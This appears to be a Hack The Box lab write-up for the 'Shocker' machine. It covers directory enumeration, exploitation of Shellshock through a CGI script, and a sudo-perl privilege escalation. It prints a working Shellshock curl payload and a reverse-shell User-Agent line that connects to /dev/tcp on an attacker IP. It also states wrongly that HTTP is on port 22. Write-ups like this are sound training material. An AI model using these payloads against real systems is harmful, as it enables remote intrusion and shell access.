---
description: https://app.hackthebox.com/machines/Shocker
---

# ⚡ Shocker

<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Starting with a NMAP, we see 2 ports open, mainly we see the HTTP web server on port 22.

Let's try to find directories:

```
dirb http://10.129.101.205
```

<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

index does not  seem so important ->

<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

but the other directories are **forbidden:**

<figure><img src="../../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

after further enumeration, i found this _**user.sh:**_

```
gobuster dir -u http://10.129.101.205/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .sh
```

<figure><img src="../../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

and when we go on the resource, it DLs the file:

<figure><img src="../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

captured the packet where the script was:

<figure><img src="../../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

found this super website [https://www.sevenlayers.com/index.php/125-exploiting-shellshock](https://www.sevenlayers.com/index.php/125-exploiting-shellshock)

on how to exploit this type of environment:

```
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id" http://192.168.90.59/cgi-bin/test.sh
```

<figure><img src="../../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

so we got a RCE, let's try to abuse it. First we get a listener going:

<figure><img src="../../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

after a bit of debug on the reverse shell user agent command:

```
() { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.86/4444 0>&1
```

<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

and the rest is history:

<figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

then quick enum for privesc:

<figure><img src="../../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Now we see we can run perl as sudo -> let's go see GTFObins

<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

Ez win on this privesc ->

<figure><img src="../../../.gitbook/assets/image (507).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
